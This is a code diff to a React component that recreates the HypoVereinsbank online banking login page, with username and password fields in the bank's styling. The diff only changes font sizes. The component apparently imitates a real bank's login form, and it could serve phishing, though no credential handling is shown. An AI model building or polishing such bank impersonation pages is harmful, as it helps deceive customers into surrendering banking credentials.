@@ -330,7 +330,7 @@ const Hypovereinsbank = () => {
                 <h1 className="text-[28px] leading-tight font-light mb-5" style={{ color: DARK }}>
                   Willkommen im HVB Online Banking
                 </h1>
-                <p className="text-[15px] mb-4 font-semibold" style={{ color: DARK }}>
+                <p className="text-[16px] mb-4 font-semibold" style={{ color: DARK }}>
                   Bitte loggen Sie sich ein.
                 </p>
 
@@ -340,7 +340,7 @@ const Hypovereinsbank = () => {
                   <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />
 
                   <label className="block mb-4">
-                    <span className="flex items-center gap-1.5 text-[15px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
+                    <span className="flex items-center gap-1.5 text-[16px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                       Direct Banking Nummer
                       <InfoHint
                         open={openHint === "user"}
@@ -355,13 +355,13 @@ const Hypovereinsbank = () => {
                       value={username}
                       onChange={(e) => setUsername(e.target.value)}
                       autoComplete="off"
-                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
+                      className="w-full h-10 px-3 text-[16px] bg-white outline-none"
                       style={{ border: `1px solid ${BORDER}` }}
                     />
                   </label>
 
                   <label className="block mb-5">
-                    <span className="flex items-center gap-1.5 text-[15px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
+                    <span className="flex items-center gap-1.5 text-[16px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                       Passwort
                       <InfoHint
                         open={openHint === "pw"}
@@ -381,7 +381,7 @@ const Hypovereinsbank = () => {
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       autoComplete="new-password"
-                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
+                      className="w-full h-10 px-3 text-[16px] bg-white outline-none"
                       style={{ border: `1px solid ${BORDER}` }}
                     />
                   </label>
@@ -390,14 +390,14 @@ const Hypovereinsbank = () => {
                     <a
                       href="#"
                       onClick={noop}
-                      className="text-[14px] underline"
+                      className="text-[15px] underline"
                       style={{ color: TEAL }}
                     >
                       Zugangsdaten vergessen/gesperrt?
                     </a>
                     <button
                       type="submit"
-                      className="text-white text-[14px] tracking-wider px-6 h-10"
+                      className="text-white text-[15px] tracking-wider px-6 h-10"
                       style={{ backgroundColor: TEAL, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}
                       onMouseOver={(e) => (e.currentTarget.style.backgroundColor = TEAL_DARK)}
                       onMouseOut={(e) => (e.currentTarget.style.backgroundColor = TEAL)}
@@ -406,7 +406,7 @@ const Hypovereinsbank = () => {
                     </button>
                   </div>
 
-                  <div className="text-[14px]" style={{ color: DARK }}>
+                  <div className="text-[15px]" style={{ color: DARK }}>
                     <div className="font-semibold mb-1">Sie haben noch kein Online Banking?</div>
                     <div>
                       <a href="#" onClick={noop} className="underline" style={{ color: TEAL }}>
